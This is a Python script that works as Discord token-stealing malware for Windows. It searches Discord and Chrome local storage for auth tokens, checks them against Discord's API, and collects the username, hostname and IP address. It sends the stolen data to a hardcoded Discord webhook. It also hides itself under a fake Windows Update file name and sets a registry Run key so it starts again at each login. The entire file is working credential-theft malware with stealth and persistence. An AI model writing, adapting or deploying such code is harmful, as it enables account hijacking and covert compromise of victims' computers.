import os
import sys
import re
import requests
import platform
import getpass
import zipfile
import shutil
import winreg
import subprocess

# === CONFIGURATION ===
WEBHOOK_URL = "https://discord.com/api/webhooks/1482800569734398115/SFTlk6o-SBVYvsd-VdUyHASuzqUIebI9Z2hQfqWc30pd2k43bZCpyWFhv8WQfq_mUrs2"
ZIP_LEVELDB = False

# === HIDDEN PERSISTENCE LOCATION ===
# Use a hidden system folder that users rarely check
HIDDEN_DIR = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Caches')
os.makedirs(HIDDEN_DIR, exist_ok=True)

# Name of the copied script (masquerade as a system file)
HIDDEN_SCRIPT = os.path.join(HIDDEN_DIR, 'wuauclt.pyw')  # Windows Update AutoUpdate Client
HIDDEN_SCRIPT_EXE = os.path.join(HIDDEN_DIR, 'wuauclt.exe')

# Registry key for persistence
REG_KEY = r'Software\Microsoft\Windows\CurrentVersion\Run'
REG_VALUE = 'WindowsUpdateClient'

# === PATHS FOR TOKEN SCANNING ===
appdata = os.getenv('APPDATA')
localappdata = os.getenv('LOCALAPPDATA')

paths_to_scan = [
    os.path.join(appdata, 'Discord', 'Local Storage', 'leveldb'),
    os.path.join(appdata, 'discordptb', 'Local Storage', 'leveldb'),
    os.path.join(appdata, 'discordcanary', 'Local Storage', 'leveldb'),
    os.path.join(localappdata, 'Google', 'Chrome', 'User Data', 'Default', 'Local Storage', 'leveldb'),
]

# === TOKEN REGEX ===
TOKEN_REGEX = re.compile(r'([a-zA-Z0-9_\-]{24}\.[a-zA-Z0-9_\-]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84})')

def is_token_valid(token):
    try:
        headers = {'Authorization': token}
        r = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=5)
        return r.status_code == 200
    except:
        return False

def find_candidates_in_file(filepath):
    candidates = set()
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
            candidates.update(TOKEN_REGEX.findall(content))
    except:
        pass
    return candidates

def gather_valid_tokens():
    all_candidates = set()
    valid_paths = []
    for path in paths_to_scan:
        if not os.path.isdir(path):
            continue
        valid_paths.append(path)
        for root, dirs, files in os.walk(path):
            for file in files:
                if file.upper() == 'LOCK' or not (file.endswith('.ldb') or file.endswith('.log')):
                    continue
                full = os.path.join(root, file)
                all_candidates.update(find_candidates_in_file(full))

    valid = set()
    for token in all_candidates:
        if is_token_valid(token):
            valid.add(token)
    return valid, valid_paths

def get_system_info():
    info = {
        'username': getpass.getuser(),
        'hostname': platform.node(),
        'platform': platform.platform(),
        'ip': 'Unknown'
    }
    try:
        info['ip'] = requests.get('https://api.ipify.org', timeout=5).text
    except:
        pass
    return info

def create_zip(paths, zip_path):
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
        for path in paths:
            for root, _, files in os.walk(path):
                for file in files:
                    full = os.path.join(root, file)
                    rel = os.path.relpath(full, start=os.path.dirname(path))
                    zf.write(full, rel)
    return zip_path

def send_to_discord(tokens, sys_info, zip_path=None):
    if not tokens:
        return
    msg = f"**Valid Discord Tokens**\nUser: {sys_info['username']}\nHost: {sys_info['hostname']}\nIP: {sys_info['ip']}\nTokens: {len(tokens)}\n```" + "\n".join(tokens) + "```"
    if len(msg) > 2000:
        msg = msg[:1997] + "..."
    data = {'content': msg}
    if zip_path and os.path.exists(zip_path):
        with open(zip_path, 'rb') as f:
            files = {'file': (os.path.basename(zip_path), f, 'application/zip')}
            requests.post(WEBHOOK_URL, data=data, files=files)
    else:
        requests.post(WEBHOOK_URL, json=data)

def hide_file(path):
    """Set file as hidden + system."""
    try:
        subprocess.run(f'attrib +h +s "{path}"', shell=True, capture_output=True)
    except:
        pass

def install_persistence():
    """Copy script to hidden location and add to registry."""
    # If running as .py, we copy the .pyw file. If compiled to .exe, copy .exe.
    if getattr(sys, 'frozen', False):
        # Compiled executable
        src = sys.executable
        dst = HIDDEN_SCRIPT_EXE
    else:
        # Python script
        src = __file__
        dst = HIDDEN_SCRIPT
    if not os.path.exists(dst):
        shutil.copy2(src, dst)
        hide_file(dst)

    # Add to registry
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_KEY, 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, REG_VALUE, 0, winreg.REG_SZ, dst)
    winreg.CloseKey(key)

def main():
    # Hide console window (only works if run with pythonw.exe)
    if not getattr(sys, 'frozen', False):
        # If running as .py, ensure we use pythonw
        if sys.executable.endswith('python.exe'):
            # Restart with pythonw
            pythonw = sys.executable.replace('python.exe', 'pythonw.exe')
            if os.path.exists(pythonw):
                subprocess.Popen([pythonw, __file__] + sys.argv[1:])
                sys.exit(0)

    # Install persistence on first run
    if not os.path.exists(HIDDEN_SCRIPT) and not os.path.exists(HIDDEN_SCRIPT_EXE):
        install_persistence()

    # Actual token grabbing logic
    valid_tokens, valid_paths = gather_valid_tokens()
    sys_info = get_system_info()

    zip_path = None
    if ZIP_LEVELDB and valid_paths:
        zip_path = os.path.join(os.environ['TEMP'], 'leveldb.zip')
        create_zip(valid_paths, zip_path)

    send_to_discord(valid_tokens, sys_info, zip_path)

    if zip_path and os.path.exists(zip_path):
        os.remove(zip_path)

if __name__ == '__main__':
    main()